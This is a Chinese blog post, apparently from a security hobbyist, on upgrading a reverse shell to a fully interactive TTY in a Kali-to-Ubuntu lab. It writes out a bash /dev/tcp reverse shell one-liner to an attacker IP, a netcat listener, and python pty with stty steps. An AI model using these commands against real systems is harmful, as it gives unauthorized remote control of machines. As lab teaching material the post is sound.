@@ -1,0 +1,424 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>反弹Shell升级为交互式Shell - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="反弹Shell升级为交互式Shell" />
+<meta property="og:description" content="1 前言看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。 然后一顿操作把一个简单的shell就升级到了一个" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/shell-to-tty/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-12-01T22:27:36+00:00" />
+<meta property="article:modified_time" content="2019-12-01T22:27:36+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="反弹Shell升级为交互式Shell"/>
+<meta name="twitter:description" content="1 前言看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。 然后一顿操作把一个简单的shell就升级到了一个"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/shell-to-tty/" /><link rel="prev" href="https://yzddmr6.com/posts/an-interesting-shell/" /><link rel="next" href="https://yzddmr6.com/posts/bypass-waf-and-hack-fish-site/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "反弹Shell升级为交互式Shell",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/shell-to-tty\/"
+        },"genre": "posts","wordcount":  730 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/shell-to-tty\/","datePublished": "2019-12-01T22:27:36+00:00","dateModified": "2019-12-01T22:27:36+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#普通shell">普通Shell</a></li>
+        <li><a href="#半交互式shell">半交互式Shell</a></li>
+        <li><a href="#完全交互式shell">完全交互式Shell</a></li>
+        <li><a href="#相关命令解析">相关命令解析</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">反弹Shell升级为交互式Shell</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-12-01">2019-12-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-12-01">2019-12-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 730 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#普通shell">普通Shell</a></li>
+        <li><a href="#半交互式shell">半交互式Shell</a></li>
+        <li><a href="#完全交互式shell">完全交互式Shell</a></li>
+        <li><a href="#相关命令解析">相关命令解析</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。</p>
+<p>然后一顿操作把一个简单的shell就升级到了一个标准交互式shell</p>
+<p>写这篇文章记录一下</p>
+<h2 id="正文" class="headerLink">
+    <a href="#%e6%ad%a3%e6%96%87" class="header-mark"></a>2 正文</h2><p>攻击机：kali</p>
+<p>靶机：ubuntu</p>
+<p>首先ubuntu建一个新用户：test，密码 test</p>
+<h3 id="普通shell" class="headerLink">
+    <a href="#%e6%99%ae%e9%80%9ashell" class="header-mark"></a>2.1 普通Shell</h3><p>给kali弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash -i &gt;&amp; /dev/tcp/192.168.145.128/4444 0&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>kali</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后发现这个shell有很多问题</p>
+<ul>
+<li>
+<p>无法使用vim等文本编辑器</p>
+</li>
+<li>
+<p>不能补全</p>
+</li>
+<li>
+<p>不能su</p>
+</li>
+<li>
+<p>没有向上箭头使用历史
+等等</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415519-955fe1ca-abbd-4956-bd34-6fd9ebc817f3.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="半交互式shell" class="headerLink">
+    <a href="#%e5%8d%8a%e4%ba%a4%e4%ba%92%e5%bc%8fshell" class="header-mark"></a>2.2 半交互式Shell</h3><p>对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在创建完成后，我们此时就可以运行su命令了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415634-b4a6424c-a7f9-4bd8-89b0-ace82c85219b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>但是还是存在很多问题</p>
+<ul>
+<li>
+<p>无法使用vim等文本编辑器</p>
+</li>
+<li>
+<p>不能补全</p>
+</li>
+<li>
+<p>没有向上箭头使用历史</p>
+</li>
+</ul>
+<h3 id="完全交互式shell" class="headerLink">
+    <a href="#%e5%ae%8c%e5%85%a8%e4%ba%a4%e4%ba%92%e5%bc%8fshell" class="header-mark"></a>2.3 完全交互式Shell</h3><p>命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span><span class="line"><span class="cl">Ctrl-Z
+</span></span><span class="line"><span class="cl">$ stty raw -echo
+</span></span><span class="line"><span class="cl">$ fg
+</span></span><span class="line"><span class="cl">$ reset
+</span></span><span class="line"><span class="cl">$ export SHELL=bash
+</span></span><span class="line"><span class="cl">//$ export TERM=xterm-256color
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415738-035aea7f-ff0e-4ebb-a242-ac5d30bcc342.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415888-bec6cccf-6a6f-4ce9-b303-7242a6a7c5eb.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>此时已经拥有了一个完全交互式Shell，就可以使用上下左右，vi，tab补全等等一系列操作，并且按Ctrl-c也不会退出。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900416037-96347a6a-f11e-4de6-8a18-e7a5139b92e1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="相关命令解析" class="headerLink">
+    <a href="#%e7%9b%b8%e5%85%b3%e5%91%bd%e4%bb%a4%e8%a7%a3%e6%9e%90" class="header-mark"></a>2.4 相关命令解析</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stty -echo #禁止回显，当在键盘上输入时，并不出现在屏幕上
+</span></span><span class="line"><span class="cl">stty echo #打开回显
+</span></span><span class="line"><span class="cl">stty raw #设置原始输入
+</span></span><span class="line"><span class="cl">stty -raw #关闭原始输入
+</span></span><span class="line"><span class="cl">bg
+</span></span><span class="line"><span class="cl">将一个在后台暂停的命令，变成继续执行
+</span></span><span class="line"><span class="cl">fg
+</span></span><span class="line"><span class="cl">将后台中的命令调至前台继续运行
+</span></span><span class="line"><span class="cl">jobs
+</span></span><span class="line"><span class="cl">查看当前有多少在后台运行的命令
+</span></span><span class="line"><span class="cl">ctrl + z
+</span></span><span class="line"><span class="cl">可以将一个正在前台执行的命令放到后台，并且暂停
+</span></span><span class="line"><span class="cl">clear
+</span></span><span class="line"><span class="cl">这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">reset
+</span></span><span class="line"><span class="cl">这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="参考链接" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" class="header-mark"></a>3 参考链接</h2><p><a href="https:_www.freebuf.com_news_142195" rel="">https://www.freebuf.com/news/142195.html</a></p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-12-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/shell-to-tty/" data-title="反弹Shell升级为交互式Shell"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/shell-to-tty/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/shell-to-tty/" data-title="反弹Shell升级为交互式Shell"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/shell-to-tty/" data-title="反弹Shell升级为交互式Shell"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/shell-to-tty/" data-title="反弹Shell升级为交互式Shell"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/shell-to-tty/" data-title="反弹Shell升级为交互式Shell" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;反弹Shell升级为交互式Shell&#34;, &#34;https://yzddmr6.com/posts/shell-to-tty/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/an-interesting-shell/" class="prev" rel="prev" title="某Shell分析以及自己的一些想法"><i class="fas fa-angle-left fa-fw"></i>某Shell分析以及自己的一些想法</a>
+            <a href="/posts/bypass-waf-and-hack-fish-site/" class="next" rel="next" title="绕过宝塔云锁注入钓鱼站">绕过宝塔云锁注入钓鱼站<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
